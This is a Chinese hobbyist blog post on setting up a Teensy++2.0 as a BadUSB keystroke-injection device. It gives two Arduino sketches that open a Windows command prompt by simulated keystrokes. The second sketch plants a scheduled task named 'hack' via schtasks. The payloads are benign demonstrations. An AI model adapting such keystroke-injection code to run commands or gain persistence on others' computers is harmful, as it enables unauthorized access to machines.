title: BadUSB —— Teensy++2.0
author: hojun
avatar: /images/favicon.png
authorDesc: 一个好奇的人
categories: 技术
date: 2017-06-07 11:18:31
authorLink: /about_hojun.html
authorAbout:
tags:
 - 搞事
 - 硬件
 - hacker
keywords: BadUSB —— Teensy++2.0
description: BadUSB —— Teensy++2.0
photos:
 - https://wx1.sinaimg.cn/large/006bYVyvgy1fljtj7mwiaj30dw0dwdmi.jpg
---
参考http://bbs.pediy.com/showthread.php?t=213719
前几天发现了BadUSB这个好玩的东西，橡皮鸭和烧鹅都买不起就在某宝上买了个Teensy++2.0
![](https://wx1.sinaimg.cn/large/006bYVyvgy1fljtj7mwiaj30dw0dwdmi.jpg)

## **1.下载Teensyduino**

https://www.pjrc.com/teensy/td_download.html

## **2.安装Arduino。我这里安装1.8.0**

https://pan.baidu.com/s/1b4jPX8#list/path=%2F&parentPath=%2FArduino

## **3.安装Teensyduino**

![](https://wx4.sinaimg.cn/mw690/006bYVyvgy1fljtj72nghj30e20atju0.jpg)
注意红色框起来的是支持的Arduino版本。

4.可以插入Teensy++2.0开始搞事了
![](https://wx4.sinaimg.cn/large/006bYVyvgy1fljtj6jkxnj30dw0gogmj.jpg)

注意：
1.汉化 file->preferences 选择language为简体中文 2.工具里面要选![](https://wx3.sinaimg.cn/large/006bYVyvgy1fljtj5zbdrj30i2051dg0.jpg)
送份代码：

代码：
```c
void setup(){ //初始化
  Keyboard.begin();//开始键盘通信
  delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键  
  delay(500);  
  Keyboard.press('r');//按下r键  
  delay(500);  
  Keyboard.release(KEY_LEFT_GUI);//松掉win键  
  Keyboard.release('r');//松掉r键  
  //delay(500);  
  Keyboard.println("cmd");//输入cmd进入DOS
  delay(500);
  Keyboard.press(KEY_RETURN);  //按下回车键
  Keyboard.release(KEY_RETURN); //释放回车键
  delay(500);  
  Keyboard.println("Hello Teensy++2.0"); 
  Keyboard.press(KEY_RETURN);  //按下回车键  
  Keyboard.release(KEY_RETURN); //释放回车键  
  delay(500);  
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键  
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键
  delay(500); 
  Keyboard.println("exit");
  Keyboard.press(KEY_RETURN);  //按下回车键  
  Keyboard.release(KEY_RETURN); //释放回车键  
  Keyboard.end();//结束键盘通讯
} 

void loop()//循环，这里的代码
{ 
//循环体 写入你要循环的代码
}
```

在附一段代码，在21点打开个txt
```c
void setup(){ //初始化
  Keyboard.begin();//开始键盘通信
  delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键  
  delay(500);  
  Keyboard.press('r');//按下r键  
  delay(500);  
  Keyboard.release(KEY_LEFT_GUI);//松掉win键  
  Keyboard.release('r');//松掉r键  
  //delay(500);  
  Keyboard.println("cmd");//输入cmd进入DOS
  delay(500);
  Keyboard.press(KEY_RETURN);  //按下回车键
  Keyboard.release(KEY_RETURN); //释放回车键
  delay(500);  
  Keyboard.println("D:");
  Keyboard.println("echo I'm back!>a.txt"); 
  Keyboard.println("schtasks /create /tn \"hack\" /tr \"d:a.txt\" /sc once /st 21:12"); 
  Keyboard.press(KEY_RETURN);  //按下回车键  
  Keyboard.release(KEY_RETURN); //释放回车键  
  delay(500);  
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键  
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键
  delay(500); 
  Keyboard.println("exit");
  Keyboard.press(KEY_RETURN);  //按下回车键  
  Keyboard.release(KEY_RETURN); //释放回车键  
  Keyboard.end();//结束键盘通讯
} 

void loop()//循环，这里的代码
{ 
//循环体 写入你要循环的代码
}
```